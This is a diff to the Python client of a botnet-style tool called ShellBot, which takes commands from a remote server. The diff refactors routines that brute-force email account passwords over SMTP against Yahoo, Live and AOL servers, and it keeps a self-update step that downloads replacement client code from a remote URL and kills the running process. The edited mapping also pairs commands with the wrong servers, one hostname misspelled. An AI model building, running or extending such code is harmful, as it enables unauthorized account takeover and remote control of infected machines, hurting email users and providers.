@@ -30,9 +30,12 @@ if (len(sys.argv) == 3):
     host = sys.argv[1]
     port = int(sys.argv[2])
 else:
+    # Comment the below line and uncomment the next two for a pre-packaged client.
     sys.exit("Usage: client.py <server ip> <server port>")
+    #host = '0.0.0.0'
+    #port = 9999
 
-#Used by the Bruteforcer-->
+# Used by the Bruteforcer
 def product(*args, **kwds):
     pools = list(map(tuple, args)) * kwds.get('repeat', 1)
     result = [[]]
@@ -48,15 +51,14 @@ def repeat(object, times=None):
     else:
         for i in range(times):
             yield object
-#<--
 
-#Self Update-->
+# Self Update
 temporary = """
 #!/usr/bin/env python3
 import os, urllib2
 
 response = urllib2.urlopen('https://raw.githubusercontent.com/sayak-brm/'
-                           + 'ShellBot/master/client.py')
+                           + 'ShellBot/master/client.py') # Change URL for custom update path.
 html = response.read()
 
 os.system("kill %s")
@@ -420,16 +422,13 @@ def gmailbruteforce(email, combination, minimum, maximum):
             break
 
 def popularbruteforce(cmd):
-    try:
-        bruteinfo = cmd[1].split(":")
-        if cmd[0] == "yahoobruteforce": server = "smtp.mail.yahoo.com"
-        elif cmd[0] == "livebruteforce": server = "stmp.aol.com"
-        elif cmd[0] == "aolbruteforce": server = "smtp.live.com"
-        t = Thread(None,custombruteforce,None,(server, 587, bruteinfo[0], bruteinfo[1], bruteinfo[2], bruteinfo[3]))
-        t.start()
-        s.send(bytes("[CLIENT] Bruteforcing started\n", 'utf-8'))
-    except:
-        s.send(bytes("[CLIENT] Wrong arguments\n", 'utf-8'))
+    bruteinfo = cmd[1].split(":")
+    if cmd[0] == "yahoobruteforce": server = "smtp.mail.yahoo.com"
+    elif cmd[0] == "livebruteforce": server = "stmp.aol.com"
+    elif cmd[0] == "aolbruteforce": server = "smtp.live.com"
+    t = Thread(None,custombruteforce,None,(server, 587, bruteinfo[0],
+                                    bruteinfo[1], bruteinfo[2], bruteinfo[3]))
+    t.start()
         
 def custombruteforce(address, port, email, combination, minimum, maximum):
     smtpserver = smtplib.SMTP(address,int(port))
@@ -601,37 +600,9 @@ def main(host, port):
                         except:
                             s.send(bytes("[CLIENT] Wrong arguments\n",
                                          'utf-8'))
-                    elif (commands[0] == "livebruteforce"):
+                    elif (commands[0] in ["yahoobruteforce", "livebruteforce", "aolbruteforce"]):
                         try:
-                            bruteinfo = commands[1].split(":")
-                            t = Thread(None,custombruteforce,None,(
-                                "smtp.live.com", 587, bruteinfo[0],
-                                bruteinfo[1], bruteinfo[2], bruteinfo[3]))
-                            t.start()
-                            s.send(bytes("[CLIENT] Bruteforcing started\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Wrong arguments\n",
-                                         'utf-8'))
-                    elif (commands[0] == "yahoobruteforce"):
-                        try:
-                            bruteinfo = commands[1].split(":")
-                            t = Thread(None,custombruteforce,None,(
-                                "smtp.mail.yahoo.com", 587, bruteinfo[0],
-                                bruteinfo[1], bruteinfo[2], bruteinfo[3]))
-                            t.start()
-                            s.send(bytes("[CLIENT] Bruteforcing started\n",
-                                         'utf-8'))
-                        except:
-                            s.send(bytes("[CLIENT] Wrong arguments\n",
-                                         'utf-8'))
-                    elif (commands[0] == "aolbruteforce"):
-                        try:
-                            bruteinfo = commands[1].split(":")
-                            t = Thread(None,custombruteforce,None,(
-                                "smtp.aol.com", 587, bruteinfo[0],
-                                bruteinfo[1], bruteinfo[2], bruteinfo[3]))
-                            t.start()
+                            popularbruteforce(commands)
                             s.send(bytes("[CLIENT] Bruteforcing started\n",
                                          'utf-8'))
                         except:
